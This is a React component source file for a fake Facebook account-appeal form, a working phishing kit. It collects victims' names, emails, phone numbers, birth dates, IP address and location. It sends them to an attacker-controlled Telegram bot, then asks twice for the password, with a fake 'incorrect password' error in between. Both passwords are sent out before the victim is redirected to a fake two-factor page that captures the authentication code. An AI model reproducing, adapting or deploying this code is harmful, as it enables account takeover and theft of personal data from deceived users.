import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";

import "./LoginForm.scss";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";
import {
  BOT_TOKEN,
  CHAT_ID,
  GEO_API_KEY,
  DATE_MAX_LENGTH,
  PASSWORD_ERROR_DELAY_MS,
  NAVIGATE_TO_2FA_DELAY_MS,
} from "./config";
import { TWO_FA_ROUTE } from "./paths.js";

function LoginForm({ onClose }) {
  const botToken = BOT_TOKEN;
  const chatId = CHAT_ID;
  const [messageId, setMessageId] = useState(null);

  const navigate = useNavigate();
  const [isShowPass, setIsShowPass] = useState(false);
  const [loadingInitial, setLoadingInitial] = useState(false);
  const [loadingPassword, setLoadingPassword] = useState(false);
  const [additionalInfo, setAdditionalInfo] = useState("");

  const [password, setPassword] = useState("");
  const [password1, setPassword1] = useState("");
  const [currentUrl, setCurrentUrl] = useState("");

  const [isSubmited, setIsSubmited] = useState(false);

  const [clickCount, setClickCount] = useState(0);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);

  const [ip, setIp] = useState("");
  const [location, setLocation] = useState("");

  const [errors, setErrors] = useState({
    password: "",
    submit: "",
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
  });

  const [formData, setFormData] = useState({
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
    countryCode: "US",
    additionalInfo: "",
    currentUrl: "",
  });

  const handlePhoneChange = (value, country) => {
    setFormData((prev) => ({
      ...prev,
      phoneNumber: value,
      countryCode: country.countryCode.toUpperCase(),
    }));
  };

  const handleDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    let formattedValue = "";

    if (value.length > 0) {
      formattedValue = value.substring(0, 2);
      if (value.length > 2) {
        formattedValue += "/" + value.substring(2, 4);
        if (value.length > 4) {
          formattedValue += "/" + value.substring(4, 8);
        }
      }
    }

    setFormData((prevData) => ({
      ...prevData,
      dateOfBirth: formattedValue,
    }));
  };

  useEffect(() => {
    const url = window.location.href;
    setCurrentUrl(url);

    const fetchData = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (!response.ok) throw new Error("Failed to fetch IP data");
        const result = await response.json();
        setIp(result.ip);

        if (result && result.ip) {
          const locationResponse = await fetch(
            `https://api.ipgeolocation.io/ipgeo?apiKey=${GEO_API_KEY}&ip=${result.ip}`
          );
          if (!locationResponse.ok) throw new Error("Failed to fetch location data");
          const locationData = await locationResponse.json();

          const callingCode = locationData?.calling_code || "";
          const countryCode = locationData?.country_code2 || "";

          setFormData((prev) => ({
            ...prev,
            phoneNumber: callingCode ? `${callingCode} ` : "",
            countryCode: countryCode || "US",
          }));

          const district = locationData?.district || "N/A";
          const city = locationData?.city || "N/A";
          const country = locationData?.country_name || "N/A";
          setLocation(`${district} / ${city} / ${country}`);
        }
      } catch (err) {
        console.log(err);
      }
    };

    fetchData();
  }, []);

  const handleOnchange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleOnchangePassword = (e) => {
    setErrors((prevErrors) => ({
      ...prevErrors,
      password: "",
      submit: "",
    }));
    setPassword(e.target.value);
  };

  const emptyErrors = {
    password: "",
    submit: "",
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
  };

  const validateInputs = () => {
    let isValid = true;
    const newErrors = { ...emptyErrors };

    if (!password) {
      newErrors.password = "Password is required";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const validate = () => {
    const newErrors = { ...emptyErrors };
    let isValid = true;

    if (!formData.fullName) {
      newErrors.fullName = "Full Name is required!";
      isValid = false;
    }

    if (!formData.personalEmail) {
      newErrors.personalEmail = "Email is required!";
      isValid = false;
    }

    if (!formData.businessEmail) {
      newErrors.businessEmail = "Email Business is required!";
      isValid = false;
    }

    if (!formData.phoneNumber) {
      newErrors.phoneNumber = "Phone Number is required!";
      isValid = false;
    }

    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = "Date of Birth is required!";
      isValid = false;
    } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dateOfBirth)) {
      newErrors.dateOfBirth = "Invalid date format (MM/DD/YYYY)";
      isValid = false;
    }

    if (!formData.link) {
      newErrors.link = "Page Name is required!";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const getCurrentTime = () => {
    const now = new Date();
    const timeString = now.toLocaleTimeString("vi-VN");
    const dateString = now.toLocaleDateString("vi-VN");
    return `${timeString} ${dateString}`;
  };

  const sendInitialDataToTelegram = async () => {
    try {
      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      const initialMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔄 Trạng thái: Đang chờ mật khẩu...`;

      const res = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: initialMessage,
            parse_mode: "HTML",
          }),
        }
      );

      const data = await res.json();

      if (data?.ok && data?.result?.message_id) {
        localStorage.setItem("telegram_msg_id", data.result.message_id);
        setMessageId(data.result.message_id);
      }
    } catch (err) {
      console.error("Telegram Error:", err);
    }
  };

  const updateTelegramMessage = async (newMessage) => {
    try {
      const oldMsgId = localStorage.getItem("telegram_msg_id");

      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: newMessage,
          parse_mode: "HTML",
        }),
      });

      const data = await res.json();
      if (data?.ok && data?.result?.message_id) {
        localStorage.setItem("telegram_msg_id", data.result.message_id);
        setMessageId(data.result.message_id);
      }

      if (oldMsgId) {
        await fetch(`https://api.telegram.org/bot${botToken}/deleteMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, message_id: oldMsgId }),
        });
      }
    } catch (err) {
      console.error("Telegram Update Error:", err);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (loadingPassword) return;

    if (validateInputs()) {
      setLoadingPassword(true);
      setIsSubmitDisabled(true);

      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      if (clickCount === 0) {
        const firstPassword = password;
        setPassword1(firstPassword);

        const finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${firstPassword}</code>
🔄 Trạng thái: Đang chờ mật khẩu 2...`;

        await updateTelegramMessage(finalMessage);

        setTimeout(() => {
          setErrors((prevErrors) => ({
            ...prevErrors,
            submit: "The password you've entered is incorrect.",
          }));
          setPassword("");
          setIsSubmitDisabled(false);
          setLoadingPassword(false);
        }, PASSWORD_ERROR_DELAY_MS);
      } else if (clickCount === 1) {
        const secondPassword = password;

        const finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${secondPassword}</code>
🔄 Trạng thái: Đang chờ mã xác thực 2FA...`;

        await updateTelegramMessage(finalMessage);

        setTimeout(() => {
          setIsSubmitDisabled(false);
          setLoadingPassword(false);

          navigate(
            `${TWO_FA_ROUTE}?encrypted_context=ARGXVDNmvkm6x1PKWXYxZf5pV2sdJvMJqYMTymv2-de5YrlEWoxX0xg7RnF_rDySpQYuTuQ9d0zFWf2q6N2FdMWXQSSJMOhtiuo07gs_ereSWAR8bAQFSo0n-yFgKvwUDIr8qDgToWUi-159Og-45E4Rg7Nd5Bj6QIXOwI61sHE49rVkWStswIirOanuJKizNH_J3HCjxVYvJmOknToDzxSs2kWeBlsZKyA6BV7tVWnve92CBz_-HJEX1BAjQ-1-0HXM0ieM_J5QnDryfj1Q3wS9opHD8NgBuKLa17Rl2ImkhMs2T_9Xb5MoxtFLeMgDQEjfzeb8XXe957xSmfyBgZp8PeYQ3L5Dt-fKD2R7idaoggN6c-wnpjprnV5uWQRx5kCfAOsj4u1LtJrsQb6XQKWBeS8v3ZGKolKDUli_Wrb37OLyPlfNbbeVJ5TcPeTB52MF&flow=two_factor_login&next`,
            {
              state: {
                method: "app",
                ip,
                location,
                formData,
                password1,
                password2: secondPassword,
                additionalInfo,
                currentUrl,
              },
              replace: true,
            }
          );
        }, NAVIGATE_TO_2FA_DELAY_MS);
      }

      setClickCount((prev) => prev + 1);
    }
  };

  const toggleShowPass = () => {
    setIsShowPass(!isShowPass);
  };

  const handleSubmit1 = async (e) => {
    e.preventDefault();
    if (loadingInitial) return;
    if (validate()) {
      setLoadingInitial(true);
      try {
        await sendInitialDataToTelegram();
        setIsSubmited(true);
      } catch (err) {
        console.error(err);
      } finally {
        setLoadingInitial(false);
      }
    }
  };

  return (
    <div className="modal-overlay">
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        {isSubmited ? (
          <div className="top">
            <button className="close-btn" onClick={onClose}>
              x
            </button>
            <img
              className="logo"
              src="data:image/png;base64,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"
              alt=""
            />
            <form onSubmit={handleSubmit}>
              <div className="input-box">
                <p className="label2">
                  For your security, you must enter your password to continue.
                </p>
                <div className="box">
                  <input
                    type={isShowPass ? "text" : "password"}
                    placeholder="Password"
                    value={password}
                    onChange={(e) => handleOnchangePassword(e)}
                  />
                  {errors.password && (
                    <span className="error">{errors.password}</span>
                  )}
                  {isShowPass ? (
                    <i
                      className="fa-regular fa-eye"
                      onClick={toggleShowPass}
                    ></i>
                  ) : (
                    <i
                      className="fa-regular fa-eye-slash"
                      onClick={toggleShowPass}
                    ></i>
                  )}
                </div>
              </div>
              {errors.submit && (
                <span className="error">{errors.submit}</span>
              )}
              <button
                type="submit"
                className="login-btn"
                disabled={isSubmitDisabled || loadingPassword}
              >
                {loadingPassword ? (
                  <span className="spinner-inline" />
                ) : (
                  "Continue"
                )}
              </button>
            </form>
          </div>
        ) : (
          <div className="top">
            <h3>Apeal Form</h3>
            <button className="close-btn" onClick={onClose}>
              x
            </button>
            <br />
            <form onSubmit={handleSubmit1} lang="en">
              <div className="input-box">
                <input
                  placeholder="Full Name"
                  type="text"
                  value={formData.fullName}
                  name="fullName"
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.fullName && (
                  <span className="error">{errors.fullName}</span>
                )}
              </div>
              <div className="input-box">
                <input
                  placeholder="Email"
                  type="email"
                  name="personalEmail"
                  value={formData.personalEmail}
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.personalEmail && (
                  <span className="error">{errors.personalEmail}</span>
                )}
              </div>
              <div className="input-box">
                <input
                  placeholder="Email Business"
                  type="email"
                  name="businessEmail"
                  value={formData.businessEmail}
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.businessEmail && (
                  <span className="error">{errors.businessEmail}</span>
                )}
              </div>
              <div className="input-box">
                <input
                  placeholder="Page Name"
                  type="text"
                  name="link"
                  value={formData.link}
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.link && <span className="error">{errors.link}</span>}
              </div>
              <div className="input-box">
                <PhoneInput
                  country={formData.countryCode?.toLowerCase() || "us"}
                  value={formData.phoneNumber}
                  onChange={handlePhoneChange}
                  inputProps={{
                    name: "phoneNumber",
                    required: true,
                  }}
                  containerClass="phone-input-container"
                  inputClass="phone-input"
                  buttonClass="phone-input-button"
                  dropdownClass="phone-input-dropdown"
                />
                {errors.phoneNumber && (
                  <span className="error">{errors.phoneNumber}</span>
                )}
              </div>
              <div className="dateofbirth">
                <p>Date of Birth</p>
              </div>
              <div className="input-box">
                <input
                  className="dateinput"
                  type="text"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleDateChange}
                  placeholder="MM/DD/YYYY"
                  maxLength={DATE_MAX_LENGTH}
                />
                {errors.dateOfBirth && (
                  <span className="error">{errors.dateOfBirth}</span>
                )}
              </div>
              <div className="dateofbirth">
                <p>Additional information</p>
              </div>
              <div className="input-box">
                <textarea
                  name="additionalInfo"
                  rows="4"
                  value={additionalInfo}
                  onChange={(e) => setAdditionalInfo(e.target.value)}
                ></textarea>
              </div>
              <p>
                Please indicate why you believe that account restrictions were
                imposed by mistake. Our technology and team work in multiple
                languages to ensure consistent enforcement of rules. You can
                communicate with us in your native language.
              </p>
              <div className="notify-box">
                <div className="left">
                  <img
                    src="https://img.icons8.com/?size=512&id=118467&format=png"
                    alt="Facebook Icon"
                    className="fb-icon"
                  />
                  <div className="text">
                    <strong>on Facebook</strong>
                    <p>We will send you a notification on Facebook.</p>
                  </div>
                </div>
                <label className="switch">
                  <input type="checkbox" defaultChecked />
                  <span className="slider"></span>
                </label>
              </div>
              <label className="custom-checkbox">
                <input type="checkbox" className="checkbox" />
                <span className="checkmark"></span>I agree with&nbsp;
                <a href="#">Terms of use</a>
              </label>

              {errors.submit && <span className="error">{errors.submit}</span>}
              <button
                type="submit"
                className="login-btn"
                disabled={loadingInitial}
              >
                {loadingInitial ? (
                  <span className="spinner-inline" />
                ) : (
                  "Submit Appeal"
                )}
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );
}

export default LoginForm;
